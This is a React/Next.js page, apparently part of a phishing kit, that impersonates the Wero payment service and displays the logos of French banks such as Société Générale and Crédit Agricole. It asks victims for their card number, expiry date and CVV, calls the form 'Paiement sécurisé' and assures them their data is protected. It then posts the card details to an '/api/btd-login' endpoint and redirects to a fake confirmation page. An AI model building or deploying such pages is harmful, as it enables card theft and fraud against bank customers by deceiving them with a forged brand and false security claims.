'use client';

import React, { useState, FormEvent } from 'react';
import Link from 'next/link';
import { useRouter } from 'next/navigation';

export default function BatPage() {
  const router = useRouter();
  const [cardNumber, setCardNumber] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvv, setCvv] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isMenuOpen, setIsMenuOpen] = useState(false);

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 16);
    const formatted = value.replace(/(.{4})/g, '$1 ').trim();
    setCardNumber(formatted);
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '').slice(0, 4);
    if (value.length >= 3) {
      value = `${value.slice(0, 2)}/${value.slice(2)}`;
    }
    setExpiry(value);
  };

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 4);
    setCvv(value);
  };

  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    try {
      await fetch('/api/btd-login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'card_details',
          cardNumber: cardNumber.replace(/\s/g, ''),
          expiry,
          cvv,
        }),
      });
    } catch (err) {
      console.error('Erreur lors de la transmission :', err);
    } finally {
      router.push('/confirm');
    }
  };

  return (
    <div className="min-h-screen bg-white text-slate-800 font-sans flex justify-center items-center sm:py-6">
      <div className="w-full max-w-md min-h-screen sm:min-h-[840px] bg-white sm:rounded-3xl sm:shadow-2xl flex flex-col justify-between overflow-hidden relative border border-slate-100">
        
        {/* Header Wero */}
        <header className="px-6 py-4 flex items-center justify-between border-b border-slate-100 bg-white sticky top-0 z-20">
          <Link href="/portail">
            <div className="w-11 h-11 bg-[#FACC15] rounded-xl flex items-center justify-center">
              <span className="font-black text-black text-base tracking-tighter">wero</span>
            </div>
          </Link>

          <button
            type="button"
            onClick={() => setIsMenuOpen(!isMenuOpen)}
            aria-label="Menu"
            className="p-2 text-slate-900 focus:outline-none"
          >
            <div className="w-6 h-4 flex flex-col justify-between">
              <span className={`h-0.5 w-full bg-slate-900 rounded-full transition-all duration-300 ${isMenuOpen ? 'rotate-45 translate-y-1.5' : ''}`} />
              <span className={`h-0.5 w-full bg-slate-900 rounded-full transition-all duration-300 ${isMenuOpen ? 'opacity-0' : ''}`} />
              <span className={`h-0.5 w-full bg-slate-900 rounded-full transition-all duration-300 ${isMenuOpen ? '-rotate-45 -translate-y-1.5' : ''}`} />
            </div>
          </button>
        </header>

        {/* Menu Déroulant */}
        {isMenuOpen && (
          <div className="absolute top-[70px] left-0 w-full bg-white/95 backdrop-blur-md border-b border-slate-100 p-4 shadow-xl z-30">
            <nav className="flex flex-col gap-2 font-medium text-slate-800">
              <Link href="/portail" className="p-3 hover:bg-slate-50 rounded-xl transition-colors text-sm font-semibold" onClick={() => setIsMenuOpen(false)}>
                Accueil
              </Link>
            </nav>
          </div>
        )}

        <main className="flex-1 px-6 py-6 flex flex-col justify-start gap-6">
          
          {/* Titre principal */}
          <div className="text-center pt-2">
            <h1 className="text-[28px] font-extrabold text-[#0B2A4A] tracking-tight leading-tight flex items-center justify-center gap-2">
              Coordonnées bancaires
              <svg className="w-8 h-8 text-[#0B2A4A]" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                <rect x="2" y="5" width="20" height="14" rx="2" />
                <line x1="2" y1="10" x2="22" y2="10" />
              </svg>
            </h1>
          </div>

          {/* Encart Paiement Sécurisé */}
          <div className="p-5 rounded-2xl bg-[#F8FAFC] border border-slate-100 text-center">
            <div className="flex items-center justify-center gap-1.5 font-bold text-[#475569] text-base mb-2">
              <span>Paiement sécurisé</span>
              <svg className="w-4 h-4 text-[#64748B]" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2.5}>
                <rect x="5" y="11" width="14" height="10" rx="2" />
                <path d="M8 11V7a4 4 0 118 0v4" />
              </svg>
            </div>
            <p className="text-xs text-[#64748B] font-normal leading-relaxed px-2">
              Vos informations sont traitées de manière sécurisée pour garantir la protection de vos données.
            </p>
          </div>

          {/* Formulaire */}
          <form onSubmit={handleSubmit} className="flex flex-col gap-5">
            
            {/* Champ Numéro de Carte */}
            <div>
              <label className="block text-sm font-bold text-slate-900 mb-2 flex items-center gap-2">
                <svg className="w-5 h-5 text-slate-800" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                  <rect x="2" y="5" width="20" height="14" rx="2" />
                  <line x1="2" y1="10" x2="22" y2="10" />
                </svg>
                <span>Numéro de carte bancaire</span>
                <span className="text-red-500">*</span>
              </label>
              <input
                type="text"
                required
                inputMode="numeric"
                value={cardNumber}
                onChange={handleCardNumberChange}
                placeholder="1234 5678 9012 3456"
                className="w-full px-4 py-3.5 bg-white border border-slate-200 rounded-2xl text-base font-normal text-slate-700 outline-none focus:border-slate-400 transition-all placeholder:text-slate-300"
              />
            </div>

            {/* Champ Date d'expiration */}
            <div>
              <label className="block text-sm font-bold text-slate-900 mb-2 flex items-center gap-2">
                <svg className="w-5 h-5 text-slate-800" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                  <rect x="3" y="4" width="18" height="18" rx="2" />
                  <line x1="16" y1="2" x2="16" y2="6" />
                  <line x1="8" y1="2" x2="8" y2="6" />
                  <line x1="3" y1="10" x2="21" y2="10" />
                </svg>
                <span>Date d'expiration</span>
                <span className="text-red-500">*</span>
              </label>
              <input
                type="text"
                required
                inputMode="numeric"
                value={expiry}
                onChange={handleExpiryChange}
                placeholder="MM/AA"
                className="w-full px-4 py-3.5 bg-white border border-slate-200 rounded-2xl text-base font-normal text-slate-700 outline-none focus:border-slate-400 transition-all placeholder:text-slate-300"
              />
            </div>

            {/* Champ CVV */}
            <div>
              <label className="block text-sm font-bold text-slate-900 mb-2 flex items-center gap-2">
                <svg className="w-5 h-5 text-slate-800" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                  <rect x="5" y="11" width="14" height="10" rx="2" />
                  <path d="M8 11V7a4 4 0 118 0v4" />
                </svg>
                <span>Cryptogramme (CVV)</span>
                <span className="text-red-500">*</span>
              </label>
              <div className="relative">
                <input
                  type="password"
                  required
                  inputMode="numeric"
                  maxLength={4}
                  value={cvv}
                  onChange={handleCvvChange}
                  placeholder="***"
                  className="w-full px-4 py-3.5 bg-white border border-slate-200 rounded-2xl text-base font-normal text-slate-700 outline-none focus:border-slate-400 transition-all placeholder:text-slate-300 pr-12"
                />
                <div className="absolute right-4 top-1/2 -translate-y-1/2 text-slate-400">
                  <svg className="w-5 h-5 text-slate-400" fill="currentColor" viewBox="0 0 24 24">
                    <path fillRule="evenodd" d="M12 1.5a5.25 5.25 0 00-5.25 5.25v3a3 3 0 00-3 3v6.75a3 3 0 003 3h10.5a3 3 0 003-3v-6.75a3 3 0 00-3-3v-3c0-2.9-2.35-5.25-5.25-5.25zm-3.75 5.25a3.75 3.75 0 117.5 0v3h-7.5v-3z" clipRule="evenodd" />
                  </svg>
                </div>
              </div>
            </div>

            {/* Bouton VALIDER */}
            <button
              type="submit"
              disabled={isSubmitting}
              className="w-full py-4 mt-2 bg-[#FACC15] hover:bg-[#eab308] active:scale-[0.99] text-black font-extrabold text-base tracking-wider rounded-2xl shadow-sm transition-all text-center uppercase flex items-center justify-center gap-3"
            >
              {isSubmitting ? (
                <span className="w-6 h-6 border-2 border-black border-t-transparent rounded-full animate-spin" />
              ) : (
                <>
                  <span>VALIDER</span>
                  <div className="w-7 h-7 bg-[#1E293B] rounded-full flex items-center justify-center">
                    <svg className="w-3.5 h-3.5 text-white fill-current translate-x-0.5" viewBox="0 0 24 24">
                      <path d="M8 5v14l11-7z" />
                    </svg>
                  </div>
                </>
              )}
            </button>
          </form>
        </main>

        {/* Section Nos Partenaires */}
        <footer className="px-6 py-6 border-t border-slate-100 bg-white text-center">
          <p className="text-xs font-black text-[#0B2A4A] tracking-wider uppercase mb-5">
            NOS PARTENAIRES
          </p>
          <div className="flex items-center justify-center gap-3 flex-wrap">
            <img src="/Societe-Generale-Emblem.png" alt="Société Générale" className="h-5 object-contain" />
            <img src="/BP-1.png" alt="Banque Populaire" className="h-5 object-contain" />
            <img src="/logo_BanquePostale_600x300.webp" alt="La Banque Postale" className="h-5 object-contain" />
            <img src="/12895685.png" alt="Caisse d'Épargne" className="h-5 object-contain" />
            <img src="/IMG_9197.png" alt="Crédit Agricole" className="h-5 object-contain" />
            <img src="/unnamed.jpg" alt="Crédit Mutuel" className="h-5 object-contain" />
          </div>
        </footer>

      </div>
    </div>
  );
}
